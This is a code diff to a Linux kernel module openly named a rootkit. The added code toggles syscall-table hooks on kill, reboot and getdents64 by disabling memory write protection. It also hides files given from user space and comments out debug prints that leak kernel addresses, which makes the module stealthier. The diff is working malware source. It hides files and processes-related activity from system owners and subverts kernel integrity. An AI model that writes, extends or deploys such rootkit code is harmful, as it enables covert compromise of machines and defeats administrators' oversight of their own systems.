@@ -27,6 +27,8 @@ static int major;
 struct cdev *kernel_cdev;
 static int is_module_hidden = 0;
 static struct list_head *hidden_module = NULL;
+static int hook_state = 0;
+static int file_hide_state = 0;
 //-----------------------------------------------------------------------------------
 
 static unsigned long *__sys_call_table;
@@ -83,10 +85,10 @@ static unsigned long *get_syscall_table(void)
 
 	// printk(KERN_INFO "sys_kill at: %p\n", sys_kill);
 	// printk(KERN_INFO "kill_addr at: %p\n", kill_addr);
-	printk(KERN_INFO "sys_call_table at: %p\n", syscall_table);
-	printk(KERN_INFO "update_mapping_prot at: %p\n", update_mapping_prot);
-	printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
-	printk(KERN_INFO "init_begin: %lx\n", init_begin);
+	// printk(KERN_INFO "sys_call_table at: %p\n", syscall_table);
+	// printk(KERN_INFO "update_mapping_prot at: %p\n", update_mapping_prot);
+	// printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
+	// printk(KERN_INFO "init_begin: %lx\n", init_begin);
 	return syscall_table;
 }
 
@@ -215,23 +217,37 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 	case IOCTL_MOD_HOOK:
 	{
 		__sys_call_table = get_syscall_table();
+
 		if (!__sys_call_table)
 		{
 			printk(KERN_INFO "Failed to get system call table\n");
 			break;
 		}
 
-		// save the original syscall
-		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
-		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
+		if (hook_state)
+		{
+			printk(KERN_INFO "unhook\n");
+			unprotect_memory();
+			__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+			__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
+			protect_memory();
+			hook_state = 0;
+		}
+		else
+		{
+			// save the original syscall
+			orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
+			orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
 
-		// hook the sys call
-		unprotect_memory();
+			// hook the sys call
+			unprotect_memory();
 
-		__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
-		__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
+			__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
+			__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
 
-		protect_memory();
+			protect_memory();
+			hook_state = 1;
+		}
 
 		break;
 	}
@@ -307,17 +323,29 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 
 	case IOCTL_FILE_HIDE:
 	{
-		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
-		unprotect_memory();
-		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
-		protect_memory();
-		// Copy the hided_file structure from user space
-		if (copy_from_user(&file_to_hide, (struct hided_file *)arg, sizeof(file_to_hide)))
+		if (file_hide_state)
 		{
-			return -EFAULT;
+			printk(KERN_INFO "unhook getdents64\n");
+			unprotect_memory();
+			__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+			protect_memory();
+			file_hide_state = 0;
 		}
+		else
+		{
+			orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
+			unprotect_memory();
+			__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
+			protect_memory();
+			// Copy the hided_file structure from user space
+			if (copy_from_user(&file_to_hide, (struct hided_file *)arg, sizeof(file_to_hide)))
+			{
+				return -EFAULT;
+			}
 
-		printk(KERN_INFO "File to hide: %s\n", file_to_hide.name);
+			printk(KERN_INFO "File to hide: %s\n", file_to_hide.name);
+			file_hide_state = 1;
+		}
 		break;
 	}
 
